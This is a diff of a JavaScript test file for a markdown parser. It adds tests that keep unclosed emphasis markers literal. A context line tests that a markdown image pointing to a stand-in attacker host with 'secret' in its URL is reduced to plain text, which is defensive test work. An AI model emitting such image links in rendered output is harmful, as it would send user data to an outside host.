@@ -16,3 +16,9 @@ test("reads bold, italics, and lists", () => {
 test("drops image and link syntax to plain text", () => {
   assert.deepEqual(blocks("![x](http://evil/?q=secret)"), [{ type: "p", spans: [{ text: "x" }] }]);
 });
+
+test("unclosed emphasis stays literal", () => {
+  assert.deepEqual(blocks("**unclosed bold"), [{ type: "p", spans: [{ text: "**unclosed bold" }] }]);
+  assert.deepEqual(blocks("*note: keep this"), [{ type: "p", spans: [{ text: "*note: keep this" }] }]);
+  assert.deepEqual(blocks("ok **a** then *b"), [{ type: "p", spans: [{ text: "ok " }, { text: "a", bold: true }, { text: " then *b" }] }]);
+});
